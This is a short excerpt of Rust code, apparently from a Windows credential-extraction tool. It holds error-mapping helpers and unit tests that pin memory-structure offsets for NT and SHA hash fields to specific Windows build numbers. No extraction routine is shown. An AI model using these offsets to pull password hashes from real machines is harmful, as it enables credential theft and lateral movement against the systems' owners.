const fn module_error(value: UserModuleError) -> CredentialError {
    error(value.stage(), value.code())
}

fn scan_error(value: ImageScanError) -> CredentialError {
    error(value.stage(), value.code())
}

fn close_error(value: crate::adapter::AdapterError) -> CredentialError {
    error("adapter-close", value.code())
}

const fn yes_no(value: bool) -> &'static str {
    if value { "yes" } else { "no" }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn known_builds_select_expected_offsets() {
        assert_eq!(session_offsets(22_631).credentials, 0x108);
        assert_eq!(primary_offsets(22_631).nt, 0x4a);
        assert_eq!(primary_offsets(19_045).sha, 0x36);
    }

    #[test]
    fn seen_sets_reject_duplicates() {
        let mut seen = Seen::new();
        assert!(seen.insert(0x1000));
        assert!(!seen.insert(0x1000));

        let mut hashes = SeenHashes::new();
        assert!(hashes.insert(&[1; 16]));
        assert!(!hashes.insert(&[1; 16]));
    }

    #[test]
    fn signed_offsets_fail_closed() {
        assert!(add_signed(4, -5).is_err());
        assert_eq!(add_signed(4, -4).ok(), Some(0));
    }
}
